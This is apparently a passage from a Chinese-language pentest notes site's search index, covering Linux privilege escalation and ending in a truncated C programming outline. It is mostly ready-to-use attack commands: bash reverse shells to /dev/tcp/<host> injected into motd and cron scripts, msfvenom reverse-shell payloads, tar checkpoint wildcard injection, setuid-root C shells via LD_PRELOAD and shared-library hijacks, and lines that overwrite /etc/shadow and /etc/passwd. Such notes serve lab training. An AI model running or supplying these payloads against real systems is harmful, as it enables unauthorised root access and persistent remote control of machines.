deny\uff1a\u8fd9\u662f\u89c4\u5219\u7684\u7c7b\u578b\uff0c\u8868\u793a\u662f\u5426\u5141\u8bb8\uff08permit\uff09\u6216\u62d2\u7edd\uff08deny\uff09\u6267\u884c\u67d0\u4e2a\u64cd\u4f5c\u3002</li> <li>options\uff1a\u8fd9\u662f\u4e00\u4e9b\u53ef\u9009\u7684\u8bbe\u7f6e\uff0c\u4f8b\u5982 nopass\uff08\u65e0\u9700\u5bc6\u7801\uff09\u548c persist\uff08\u6301\u4e45\u5316\uff09\u3002</li> <li>identity\uff1a\u8fd9\u662f\u8981\u6267\u884c\u547d\u4ee4\u7684\u7528\u6237\u7684\u8eab\u4efd\u3002</li> <li>as target\uff1a\u8fd9\u662f\u53ef\u9009\u7684\uff0c\u8868\u793a\u4ee5\u54ea\u4e2a\u7528\u6237\u7684\u8eab\u4efd\u6267\u884c\u547d\u4ee4\u3002</li> <li>cmd command [args...]\uff1a\u8fd9\u662f\u8981\u6267\u884c\u7684\u547d\u4ee4\u548c\u53c2\u6570\u3002</li> </ul> <p>\u4f8b\u5982\uff0c\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u89c4\u5219\uff0c\u5141\u8bb8 wheel \u7ec4\u4e2d\u7684\u6240\u6709\u7528\u6237\u4ee5 root \u7528\u6237\u7684\u8eab\u4efd\u6267\u884c\u4efb\u4f55\u547d\u4ee4\uff1a</p> <pre><code>permit :wheel\n</code></pre> <p>\u8868\u793a\u5141\u8bb8\u5c5e\u4e8e\"wheel\"\u7ec4\u7684\u7528\u6237\u4f7f\u7528doas\u547d\u4ee4\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0cOpenBSD\u7cfb\u7edf\u4e2d\u7684\u7ba1\u7406\u5458\u7528\u6237\u4f1a\u88ab\u5206\u914d\u5230\"wheel\"\u7ec4\uff0c\u6240\u4ee5\u8fd9\u4e2a\u914d\u7f6e\u9879\u5141\u8bb8\u8fd9\u4e9b\u7ba1\u7406\u5458\u7528\u6237\u4f7f\u7528doas\u6765\u6267\u884c\u7279\u6743\u64cd\u4f5c\u3002</p> <p>\u4f8b\u5982\uff0c\u4e5f\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u89c4\u5219\uff0c\u5141\u8bb8\u7279\u5b9a\u7528\u6237\u65e0\u9700\u5bc6\u7801\u5c31\u53ef\u4ee5\u6267\u884c\u7279\u5b9a\u547d\u4ee4\uff1a</p> <pre><code>permit nopass larry cmd /sbin/reboot\n</code></pre> <p>\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u7528\u6237 larry \u53ef\u4ee5\u65e0\u9700\u5bc6\u7801\u5c31\u53ef\u4ee5\u6267\u884c /sbin/reboot \u547d\u4ee4\u3002</p>"},{"location":"Pentest/6.priviledge_escalation/linux/11.motd_mechanism/","title":"motd mechanism","text":"<pre><code>ls -l /etc/update-motd.d\n# \u82e5\u6709\u5199\u5165\u6743\u9650\uff0c\u5219\u6ce8\u5165\u63d0\u6743\u4ee3\u7801\necho 'bash -c \"bash -i &gt;&amp; /dev/tcp/&lt;host&gt;/1234 0&gt;&amp;1\"' &gt;&gt; /etc/update-motd.d/&lt;onefile&gt;\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/12.prng_for_ssh/","title":"prng for ssh private key","text":"<p>\u9776\u673a\u4e2d\u53ef\u4ee5\u83b7\u53d6ssh\u5b58\u50a8\u7684\u516c\u94a5\u6587\u4ef6 (/home/user/.ssh/authorized_keys)\uff0c\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff0c\u751f\u6210\u5168\u90e8\u7684\u79c1\u94a5\uff0c\u8fdb\u884c\u78b0\u649e\u5bf9\u6bd4\u516c\u94a5\u3002</p> <pre><code>searchsploit -m 5622.txt\nwget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2\ntar vjxf 5622.tar.bz2\ngrep -lr 'xxxxxxxxxxxxxxxxx'\nssh -i &lt;priv_key&gt; &lt;user&gt;@&lt;ip&gt;\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/12.prng_for_ssh/#ssh-asym-encrypt","title":"ssh asym encrypt","text":"<p>\u5728\u8fdc\u7a0b\u4e3b\u673a\u4e0a\uff0c\u6bcf\u4e2a\u7528\u6237\u901a\u5e38\u90fd\u6709\u4e00\u4e2a\u540d\u4e3a\u00a0<code>.ssh</code>\u00a0\u7684\u9690\u85cf\u6587\u4ef6\u5939\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u4e00\u4e9b\u4e0e SSH \u76f8\u5173\u7684\u6587\u4ef6\uff0c\u5176\u4e2d\u4e4b\u4e00\u5c31\u662f\u00a0<code>authorized_keys</code>\u3002\u8be5\u6587\u4ef6\u5305\u542b\u4e86\u4e00\u7cfb\u5217\u7684\u516c\u94a5\uff0c\u7528\u4e8e\u9a8c\u8bc1\u7528\u6237\u7684\u8eab\u4efd\u3002</p> <p>\u5f53\u4f60\u5c1d\u8bd5\u4f7f\u7528 SSH \u5bc6\u94a5\u5bf9\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u65f6\uff0c\u8fdc\u7a0b\u4e3b\u673a\u4f1a\u68c0\u67e5\u4f60\u63d0\u4f9b\u7684\u516c\u94a5\u662f\u5426\u5b58\u5728\u4e8e\u00a0<code>authorized_keys</code>\u00a0\u6587\u4ef6\u4e2d\u3002\u5982\u679c\u5b58\u5728\u5339\u914d\u7684\u516c\u94a5\uff0c\u8fdc\u7a0b\u4e3b\u673a\u5c06\u9a8c\u8bc1\u6210\u529f\uff0c\u5141\u8bb8\u4f60\u767b\u5f55\u7cfb\u7edf\u3002</p> <p><code>authorized_keys</code>\u00a0\u6587\u4ef6\u7684\u6743\u9650\u5e94\u8be5\u8bbe\u7f6e\u4e3a\u53ea\u6709\u7528\u6237\u672c\u4eba\u53ef\u8bfb\u5199\uff08\u4f8b\u5982\uff0c\u6743\u9650\u8bbe\u7f6e\u4e3a 600\uff09\uff0c\u4ee5\u786e\u4fdd\u79c1\u94a5\u7684\u5b89\u5168\u6027\u3002</p>"},{"location":"Pentest/6.priviledge_escalation/linux/2.shadow/","title":"Readable","text":"<p>\u7834\u89e3root\u5bc6\u7801</p> <pre><code>cat /etc/shadow | grep ':\\$' | tee hash\njohn --wordlist=&lt;rockyou.txt&gt; hash\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/2.shadow/#writable","title":"Writable","text":"<p>\u4fee\u6539root\u5bc6\u7801</p> <pre><code>mkpasswd -m sha-512 qwe\necho 'root:&lt;passwd&gt;:19509:0:99999:7:::' &gt;&gt; /etc/shadow\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/3.passwd/","title":"Writable","text":"<pre><code>openssl passwd -1 -salt qwe qwe\nopenssl passwd qwe\necho '&lt;passwd&gt;' &gt;&gt; /etc/passwd\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/4.sudo_env_vars/","title":"sudo environment variables","text":"<p><code>env_keep+=LD_PRELOAD</code>\u662f\u6307\u5728\u4f7f\u7528<code>sudo</code>\u547d\u4ee4\u65f6\uff0c\u73af\u5883\u53d8\u91cf<code>LD_PRELOAD</code>\u5c06\u4fdd\u6301\u4e0d\u53d8\u3002<code>LD_PRELOAD</code>\u662f\u4e00\u4e2a\u73af\u5883\u53d8\u91cf\uff0c\u5b83\u5141\u8bb8\u7528\u6237\u5728\u7a0b\u5e8f\u52a0\u8f7d\u65f6\u9884\u5148\u52a0\u8f7d\u6307\u5b9a\u7684\u5171\u4eab\u5e93\u3002</p> <p>\u56e0\u6b64\uff0c\u53ef\u4ee5\u628a\u63d0\u6743\u7684\u4ee3\u7801\u5199\u5165\u5171\u4eab\u5e93\u4e2d\uff0c\u4f7f\u7528\u4e0d\u9700\u8981\u5bc6\u7801\u7684\u547d\u4ee4\u9884\u52a0\u8f7d\u8fd9\u4e2a\u5171\u4eab\u5e93\u5b9e\u73b0\u63d0\u6743\u3002</p> <p>\u5f53\u524d\u9776\u673a\u53ef\u4ee5\u6267\u884c\u4ec0\u4e48\u7cfb\u7edf\u547d\u4ee4\uff0csudo\u73af\u5883\u53d8\u91cf\u8bbe\u7f6e\u662f\u4ec0\u4e48</p> <pre><code>sudo -l\n# env_rest, env_keep+=LD_PRELOAD\n# (root) NOPASSWD: /binfile\ngcc -fPIC -shared -nostartfiles -o shell.so shell.c\nsudo LD_PRELOAD=/tmp/shell.so /binfile\n</code></pre> <pre><code># file: pri.c\n\n#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;stdlib.h&gt;\n\n// filename: shell.c\n// define a shared object\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\"); # once is enough\n    setgid(0);\n    setuid(0);\n    system(\"/bin/bash -p\");\n}\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/5.schedule_jobs/","title":"schedule tasks","text":""},{"location":"Pentest/6.priviledge_escalation/linux/5.schedule_jobs/#_1","title":"\u6587\u4ef6\u6743\u9650","text":"<p>root\u6743\u9650\u81ea\u52a8\u4efb\u52a1\u811a\u672c\u53ef\u5199\uff0c\u5199\u5165\u53cd\u5f39shell</p> <pre><code>cat /etc/crontab\n# root /path/file writable\necho 'bash -i &gt;&amp; /dev/tcp/&lt;host&gt;/1234 0&gt;&amp;1' &gt;&gt; /file\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/5.schedule_jobs/#path","title":"PATH\u73af\u5883\u53d8\u91cf","text":"<p>root\u6743\u9650\u81ea\u52a8\u4efb\u52a1\u5b58\u5728\uff0c\u8def\u5f84\u4e3a\u76f8\u5bf9\u5730\u5740\uff0cPATH\u4e2d\u5b58\u5728\u53ef\u5199\u6587\u4ef6\u5939\uff0c\u5728\u5176\u4e2d\u7f16\u5199\u540c\u540d\u81ea\u52a8\u4efb\u52a1\u6587\u4ef6</p> <ul> <li>\u5199\u5165\u53cd\u5f39shell</li> </ul> <pre><code>echo '#!/bin/bash' &gt; OnePATH/file\necho 'bash -i &gt;&amp; /dev/tcp/&lt;host&gt;/1234 0&gt;&amp;1' &gt;&gt; OnePATH/file\n</code></pre> <ul> <li>\u5199\u5165\u63d0\u6743\u4ee3\u7801</li> </ul> <pre><code>#!/bin/bash\n\ncp /bin/bash /tmp/rootbash\nchmod +xs /tmp/rootbash\n</code></pre> <pre><code>/tmp/rootbash -p # -p: priviledged, run as suid\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/5.schedule_jobs/#tarcheckpoint","title":"tar\u547d\u4ee4\u2014checkpoint\u673a\u5236","text":"<p>root\u6743\u9650\u81ea\u52a8\u4efb\u52a1\u811a\u672c\u5b58\u5728\uff0c\u811a\u672c\u4e2d\u5b58\u5728tar\u547d\u4ee4\uff0c\u4f7f\u7528tar\u547d\u4ee4\u7684\u2014checkpoint\u673a\u5236\u6267\u884c\u53cd\u5f39shell\u3002</p> <p>\u539f\u7406\uff1a</p> <p>\u5728 Linux \u7684 <code>tar</code> \u547d\u4ee4\u4e2d\uff0c<code>--checkpoint</code> \u9009\u9879\u7528\u4e8e\u5728\u8bfb\u53d6\u6216\u5199\u5165\u6bcf n \u6761\u8bb0\u5f55\u65f6\u8bbe\u7f6e\u68c0\u67e5\u70b9\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cn \u7684\u503c\u4e3a 10\u3002\u68c0\u67e5\u70b9\u5141\u8bb8\u6211\u4eec\u5b9a\u671f\u6267\u884c\u4efb\u610f\u64cd\u4f5c\u3002 \u8fd9\u4e9b\u64cd\u4f5c\u5305\u62ec\u6682\u505c\u3001\u663e\u793a\u6587\u672c\u6d88\u606f\u4ee5\u53ca\u6267\u884c\u4efb\u610f\u5916\u90e8\u7a0b\u5e8f\u3002\u8fd9\u4e9b\u64cd\u4f5c\u662f\u901a\u8fc7 <code>--checkpoint-action</code> \u9009\u9879\u5b9a\u4e49\u7684\u3002</p> <pre><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;host&gt; LPORT=&lt;port&gt; -f elf -o shell.elf\n# /path/to/rshell = path of running tar cmd\ntouch /path/to/rshell--checkpoint=1\ntouch /path/to/rshell--checkpoint-action=exec=shell.elf\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/5.schedule_jobs/#_2","title":"\u81ea\u52a8\u4efb\u52a1\u65f6\u95f4\u4e2d\u7684\u901a\u914d\u7b26","text":"<p>\u683c\u5f0f</p> <pre><code>m h dom mon dow\n</code></pre> <p>\u5728\u81ea\u52a8\u4efb\u52a1\u4e2d\uff0c\u901a\u914d\u7b26\u7528\u4e8e\u8868\u793a\u4e00\u7ec4\u503c\u3002\u4ee5\u4e0b\u662f\u4e00\u4e9b\u5e38\u89c1\u7684\u901a\u914d\u7b26\u53ca\u5176\u542b\u4e49\uff1a</p> <ul> <li>\uff1a\u8868\u793a\u4efb\u4f55\u53ef\u80fd\u7684\u503c\u3002\u4f8b\u5982\uff0c\u5728 cron \u8868\u8fbe\u5f0f\u4e2d\uff0c\u5982\u679c\u5728\u201c\u5c0f\u65f6\u201d\u5b57\u6bb5\u4e2d\u4f7f\u7528 \uff0c\u5219\u8868\u793a\u201c\u6bcf\u4e2a\u5c0f\u65f6\u201d\u3002</li> <li>?\uff1a\u8868\u793a\u4e0d\u6307\u5b9a\u503c\u3002\u8fd9\u5728\u67d0\u4e9b\u5b57\u6bb5\uff08\u5982 cron \u8868\u8fbe\u5f0f\u7684\u201c\u65e5\u201d\u548c\u201c\u5468\u201d\u5b57\u6bb5\uff09\u4e2d\u5f88\u6709\u7528\uff0c\u5f53\u4f60\u60f3\u5ffd\u7565\u8fd9\u4e2a\u5b57\u6bb5\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528 ?\u3002</li> <li>-\uff1a\u8868\u793a\u4e00\u4e2a\u8303\u56f4\u3002\u4f8b\u5982\uff0c\u5728 cron \u8868\u8fbe\u5f0f\u4e2d\uff0c1-5 \u8868\u793a\u201c\u4ece 1 \u5230 5\u201d\u3002</li> <li>,\uff1a\u7528\u4e8e\u6307\u5b9a\u591a\u4e2a\u503c\u3002\u4f8b\u5982\uff0c\u5728 cron \u8868\u8fbe\u5f0f\u4e2d\uff0c1,3,5 \u8868\u793a\u201c1\u30013 \u548c 5\u201d\u3002</li> <li>/\uff1a\u7528\u4e8e\u6307\u5b9a\u95f4\u9694\u503c\u3002\u4f8b\u5982\uff0c\u5728 cron \u8868\u8fbe\u5f0f\u4e2d\uff0c*/5 \u8868\u793a\u201c\u6bcf 5 \u4e2a\u5355\u4f4d\u201d\u3002</li> </ul>"},{"location":"Pentest/6.priviledge_escalation/linux/6.suid/","title":"suid","text":"<pre><code>find / -perm -u=s -type f 2&gt;/dev/null # \u67e5\u627e\u6709SUID\u6743\u9650\u7684\u6587\u4ef6\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/6.suid/#_1","title":"\u53ef\u6267\u884c\u6587\u4ef6\u5df2\u77e5\u6f0f\u6d1e","text":"<p>\u7528searchsploit\u5bf9SUID\u53ef\u6267\u884c\u6587\u4ef6\u8fdb\u884c\u641c\u96c6\uff0c\u67e5\u770b\u53ef\u5229\u7528\u7684\u6f0f\u6d1e</p>"},{"location":"Pentest/6.priviledge_escalation/linux/6.suid/#_2","title":"\u5171\u4eab\u5e93\u6ce8\u5165","text":"<p>\u5bf9\u6709SUID\u6743\u9650\u7684\u6587\u4ef6\u8fdb\u884c\u5206\u6790\uff0c\u5982\u679c\u6709\u62a5\u9519\u7684\u5185\u5bb9\u8868\u9762\u8fd9\u4e2a\u6587\u4ef6\u8bf7\u6c42\u4e86\u4e00\u4e2a\u5171\u4eab\u5e93\uff0c\u90a3\u4e48\u53ef\u4ee5\u4f2a\u9020\u5171\u4eab\u5e93\u6ce8\u5165\u63d0\u6743\u4ee3\u7801</p> <pre><code>strings &lt;file&gt;\nstrace &lt;file&gt; 2&gt;&amp;1\n</code></pre> <pre><code># file: pri.c\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstatic void inject() __attribute__((constructor)); # \u5171\u4eab\u5e93\u88ab\u52a0\u8f7d\u65f6\u4f1a\u81ea\u52a8\u6267\u884c\u8fd9\u4e2a\u51fd\u6570\n\nvoid inject() {\n        setgid(0);\n        setuid(0);\n        system(\"/bin/bash -p\");\n}\n</code></pre> <pre><code>gcc -fPIC -shared -o &lt;file.so&gt; &lt;file.c&gt;\n</code></pre> <p>\u5728C\u8bed\u8a00\u4e2d\uff0c<code>__attribute__((constructor))</code> \u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u5c5e\u6027\uff0c\u5b83\u7528\u4e8e\u6307\u5b9a\u4e00\u4e2a\u51fd\u6570\u5728\u7a0b\u5e8f\u8fd0\u884c\u65f6\u7684\u521d\u59cb\u5316\u9636\u6bb5\u88ab\u81ea\u52a8\u8c03\u7528\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u5f53\u7a0b\u5e8f\u52a0\u8f7d\u65f6\uff0c\u5177\u6709\u6b64\u5c5e\u6027\u7684\u51fd\u6570\u4f1a\u5728 main() \u51fd\u6570\u6267\u884c\u4e4b\u524d\u88ab\u81ea\u52a8\u8c03\u7528\u3002\u8fd9\u4e2a\u7279\u6027\u901a\u5e38\u7528\u4e8e\u6267\u884c\u4e00\u4e9b\u5168\u5c40\u521d\u59cb\u5316\u64cd\u4f5c\uff0c\u4f8b\u5982\u521d\u59cb\u5316\u5168\u5c40\u53d8\u91cf\u3001\u6253\u5f00\u6587\u4ef6\u3001\u5efa\u7acb\u8fde\u63a5\u7b49\u3002 \u53e6\u5916\uff0c\u8fd8\u6709\u4e00\u4e2a\u5bf9\u5e94\u7684 <code>__attribute((destructor))__</code> \u5c5e\u6027\uff0c\u5b83\u8ba9\u7cfb\u7edf\u5728 main() \u51fd\u6570\u9000\u51fa\u6216\u8005\u8c03\u7528\u4e86 exit() \u4e4b\u540e\uff0c\u8c03\u7528\u6211\u4eec\u7684\u51fd\u6570\u3002\u5e26\u6709\u8fd9\u4e9b\u4fee\u9970\u5c5e\u6027\u7684\u51fd\u6570\uff0c\u5bf9\u4e8e\u6211\u4eec\u521d\u59cb\u5316\u4e00\u4e9b\u5728\u7a0b\u5e8f\u4e2d\u4f7f\u7528\u7684\u6570\u636e\u975e\u5e38\u6709\u7528\u3002</p>"},{"location":"Pentest/6.priviledge_escalation/linux/6.suid/#_3","title":"\u73af\u5883\u53d8\u91cf\u5229\u7528","text":"<p>\u5bf9\u6709SUID\u6743\u9650\u7684\u6587\u4ef6\u8fdb\u884c\u5206\u6790(strings strace)\uff0c\u5982\u679c\u91cc\u9762\u6709\u76f8\u5bf9\u8def\u5f84\u7684\u547d\u4ee4\u6587\u4ef6\uff0c\u5229\u7528PATH\u73af\u5883\u53d8\u91cf\uff0c\u5219\u53ef\u4ee5\u4f2a\u9020\u6587\u4ef6\u6ce8\u5165\u63d0\u6743\u4ee3\u7801</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid main() {\n        setgid(0);\n        setuid(0);\n        system(\"/bin/bash -p\");\n}\n</code></pre> <pre><code>export PATH=.:$PATH # \u4f7f\u5f97\u5f53\u524d\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u4f18\u5148\u6267\u884c\ngcc -o &lt;file&gt; &lt;file.c&gt;\n/suid-file\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/6.suid/#suid-shell","title":"SUID-Shell\u529f\u80fd","text":""},{"location":"Pentest/6.priviledge_escalation/linux/6.suid/#1-bash-version-42","title":"(1) bash version &lt; 4.2","text":"<p>bash\u5728\u6267\u884c\u7684\u65f6\u5019\uff0c\u5bf9\u4e8e\u81ea\u8eab\u5b9a\u4e49\u7684\u51fd\u6570\u4f18\u5148\u7ea7\u9ad8\u4e8e\u73af\u5883\u53d8\u91cf\uff08\u7c7b\u4f3c\u4e8e\u73af\u5883\u53d8\u91cf\u8986\u76d6\uff0c\u7528\u66f4\u9ad8\u4f18\u5148\u7ea7\u7684\u73af\u5883\u53d8\u91cf\u52ab\u6301\u6389\u8fd9\u4e2a\u547d\u4ee4\uff0c\u6ce8\u5165\u63d0\u6743\u4ee3\u7801</p> <p>\u5728 Bash \u7248\u672c\u5c0f\u4e8e 4.2 \u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u4f7f\u7528\u8def\u5f84\u7684\u7ec4\u5408\u4f5c\u4e3a\u51fd\u6570\u7684\u540d\u79f0\u6765\u5b9a\u4e49\u51fd\u6570\u3002\u8fd9\u610f\u5473\u7740\u53ef\u4ee5\u4f7f\u7528\u50cf\u6587\u4ef6\u8def\u5f84\u4e00\u6837\u7684\u5b57\u7b26\u4e32\u6765\u547d\u540d\u4f60\u7684\u51fd\u6570\u3002\u4f8b\u5982\uff0c\u4f60\u53ef\u4ee5\u5b9a\u4e49\u4e00\u4e2a\u540d\u4e3a\u00a0<code>dir/subdir/myfunc</code>\u00a0\u7684\u51fd\u6570\u3002\u7136\u540e\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u00a0<code>dir/subdir/myfunc</code>\u00a0\u6765\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u3002</p> <pre><code>strings &lt;file&gt;\n# /usr/bin/service apache2 start\n\nfunction /usr/bin/service { /bin/bash -p; }\nexport -f /usr/bin/service\n&lt;file&gt;\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/6.suid/#2-bash-version-44","title":"(2) bash version &lt; 4.4","text":"<p>bash\u7248\u672c\u4f4e\u4e8e4.4\u7684\u65f6\u5019\uff0c\u8c03\u8bd5\u6a21\u5f0f\uff0c\u5bf9bash\u7684\u73af\u5883\u53d8\u91cf\u8fdb\u884c\u8bbe\u7f6e</p> <pre><code>env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)' /usr/bin/&lt;file&gt;\n</code></pre> <ul> <li><code>env -i</code>\uff1a\u8fd9\u4e2a\u547d\u4ee4\u4f1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u73af\u5883\uff0c\u5e76\u5728\u8fd9\u4e2a\u65b0\u73af\u5883\u4e2d\u8fd0\u884c\u540e\u9762\u7684\u547d\u4ee4\u3002\u65b0\u73af\u5883\u4e2d\u4e0d\u5305\u542b\u4efb\u4f55\u539f\u6765\u7684\u73af\u5883\u53d8\u91cf\u3002</li> <li><code>SHELLOPTS=xtrace</code>\uff1a\u8fd9\u4e2a\u547d\u4ee4\u4f1a\u8bbe\u7f6e SHELLOPTS \u73af\u5883\u53d8\u91cf\u7684\u503c\u4e3a xtrace\u3002xtrace \u662f Bash \u7684\u4e00\u4e2a\u9009\u9879\uff0c\u5f53\u5b83\u88ab\u8bbe\u7f6e\u65f6\uff0cBash \u4f1a\u6253\u5370\u51fa\u6bcf\u4e00\u6761\u6267\u884c\u7684\u547d\u4ee4\u3002\u8fd9\u5bf9\u4e8e\u8c03\u8bd5\u811a\u672c\u975e\u5e38\u6709\u7528\u3002</li> <li><code>PS4='$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)'</code>\uff1a\u8fd9\u4e2a\u547d\u4ee4\u4f1a\u8bbe\u7f6e PS4 \u73af\u5883\u53d8\u91cf\u7684\u503c\u4e3a '$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)'\u3002PS4 \u662f Bash \u7684\u4e00\u4e2a\u7279\u6b8a\u53d8\u91cf\uff0c\u5b83\u5b9a\u4e49\u4e86\u5728 xtrace \u6a21\u5f0f\u4e0b\u6bcf\u4e00\u6761\u547d\u4ee4\u6267\u884c\u524d\u6253\u5370\u7684\u63d0\u793a\u7b26\u3002\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u5c06\u63d0\u793a\u7b26\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u547d\u4ee4\uff0c\u8fd9\u4e2a\u547d\u4ee4\u4f1a\u590d\u5236 /bin/bash \u5230 /tmp/rootbash\uff0c\u5e76\u7ed9 /tmp/rootbash \u8bbe\u7f6e SUID \u548c\u53ef\u6267\u884c\u6743\u9650\u3002</li> </ul>"},{"location":"Pentest/6.priviledge_escalation/linux/7.password_and_keys/","title":"password and keys","text":""},{"location":"Pentest/6.priviledge_escalation/linux/7.password_and_keys/#history-files","title":"history files","text":"<pre><code>history\ncat ~/.*history | less \ncat ~/.viminfo\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/7.password_and_keys/#config-files","title":"config files","text":"<p>Config files often contain passwords in plaintext or other reversible formats.</p> <p>\u901a\u8fc7\u679a\u4e3e\u770b\u5230\u9776\u673a\u4e2d\u6709\u54ea\u4e9b\u5e94\u7528\uff0c\u7136\u540e\u53bb\u5bfb\u627e\u8fd9\u4e9b\u5e94\u7528\u7684\u914d\u7f6e\u6587\u4ef6</p> <pre><code>ls -liah | grep -E *.ovpn\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/7.password_and_keys/#ssh-keys","title":"ssh keys","text":"<p>\u67e5\u770b\u5bb6\u76ee\u5f55\u4e0b\u662f\u5426\u6709SSH\u5bc6\u94a5</p> <pre><code>ls -liah ~/.ssh\nls -liah /.ssh\n</code></pre> <pre><code>touch id_rsa &amp;&amp; chmod 600 id_rsa\nsudo ssh -i id_rsa root@&lt;ip&gt;\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/8.nfs/","title":"nfs","text":"<p>NFS\u4f5c\u4e3a\u63d0\u6743\u9014\u5f84</p> <pre><code>cat /etc/exports\n# no_root_squash \u8868\u793a\u53ef\u4ee5\u63d0\u6743\u5229\u7528\n</code></pre> <pre><code>su root\nmkdir /tmp/nfs\nmount -o rw,vers=3 &lt;target&gt;:/tmp /tmp/nfs\ncd /tmp/nfs\nmsfvenom -p linux/x64/exec CMD=\"/bin/bash -p\" -f elf -o shell.elf\nchmod +xs shell.elf\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/9.kernel_exploits/","title":"kernel exploits","text":"<pre><code>searchsploit Linux Kernel\n</code></pre>"},{"location":"RE/","title":"RE","text":"<ul> <li> Langs<ul> <li> C</li> <li> C++</li> <li> Python</li> </ul> </li> <li> Data Structure</li> <li> Algorithms</li> <li> STL</li> <li> BOOST</li> <li> Concurrent Progrm</li> <li> Windows Internals<ul> <li> SDK</li> <li> MFC</li> <li> System Progrm</li> <li> PE</li> </ul> </li> <li> RE Details<ul> <li> x86/64 Asm</li> <li> C/C++ RE</li> <li> Anti-reversing Techniques</li> <li> Malware Analysis</li> </ul> </li> <li> Network<ul> <li> Principles</li> <li> Windows Network Progrm</li> </ul> </li> </ul>"},{"location":"RE/langs/C/","title":"C Programming","text":""},{"location":"RE/langs/C/#_1","title":"\u57fa\u7840\u77e5\u8bc6","text":""},{"location":"RE/langs/C/#c","title":"C\u8bed\u8a00\u6807\u51c6","text":"<ul> <li>K&amp;R</li> <li>C89/C90</li> <li>C99</li> <li>C11</li> </ul>"},{"location":"RE/langs/C/#c_1","title":"C\u4ee3\u7801\u7f16\u5199\u6b65\u9aa4","text":"<ol> <li>\u786e\u5b9a\u9700\u6c42</li> <li>\u8bbe\u8ba1\u7a0b\u5e8f</li> <li>\u7f16\u5199\u4ee3\u7801</li> <li>\u8fd0\u884c</li> <li>\u6d4b\u8bd5\u548c\u8c03\u8bd5</li> <li>\u7ef4\u62a4\u548c\u4fee\u6539</li> </ol>"},{"location":"RE/langs/C/#_2","title":"\u4e8c\u8fdb\u5236\u4ee3\u7801\u751f\u6210\u6b65\u9aa4","text":"<ol> <li>\u9884\u5904\u7406\uff1a\u590d\u5236\u5934\u6587\u4ef6\u5185\u5bb9\uff0c\u66ff\u6362\u5b8f\u7684\u5185\u5bb9\u7b49</li> <li>\u7f16\u8bd1\uff1a\u5c06C\u4ee3\u7801\u7f16\u8bd1\u4e3a\u6c47\u7f16\u4ee3\u7801</li> <li>\u6c47\u7f16\uff1a\u5c06\u6c47\u7f16\u4ee3\u7801\u6c47\u7f16\u4e3a\u4e8c\u8fdb\u5236\u4ee3\u7801</li> <li>\u94fe\u63a5\uff1a\u52a0\u8f7d\u542f\u52a8\u4ee3\u7801\u548c\u5e93\u6587\u4ef6\u7b49</li> </ol> <pre><code># preprocess\ngcc -E a.c -o a.i\n# compile\ngcc -S a.i -o a.s\n# assemble\ngcc -c a.s -o a.o\n# link\ngcc a.o -o a.out\n</code></pre> <pre><code># 32bit compile\ngcc a.c -m32\n# dependencies:\nsudo apt install build-essential gcc-multilib g++-multilib gcc g++\n</code></pre>"},{"location":"RE/langs/C/#_3","title":"\u8fdb\u5236\u548c\u4f4d","text":"<p>\u8fdb\u5236</p> <ul> <li>bin</li> <li>oct</li> <li>dec</li> <li>hex</li> </ul> <p>\u4f4d</p> <ul> <li>32bit</li> <li>64bit</li> </ul> <p>\u5b57\u5bbd</p> <ul> <li>QWORD 64bit</li> <li>FWORD 48bit</li> <li>DWORD 32bit</li> <li>WORD 16bit</li> <li>BIT 1bit</li> </ul>"},{"location":"RE/langs/C/#vs","title":"VS\u5e38\u89c4\u64cd\u4f5c","text":"<ul> <li>F5 \u8fd0\u884c</li> <li>F9 \u65ad\u70b9</li> <li>F10 \u5355\u6b65\u6b65\u8fc7</li> <li>F11 \u5355\u6b65\u6b65\u5165</li> </ul>"},{"location":"RE/langs/C/#clion","title":"Clion\u5e38\u89c4\u64cd\u4f5c","text":"<p>\u5236\u4f5c\u56fe\u6807\uff1a</p> /usr/share/applications<pre><code>[Desktop 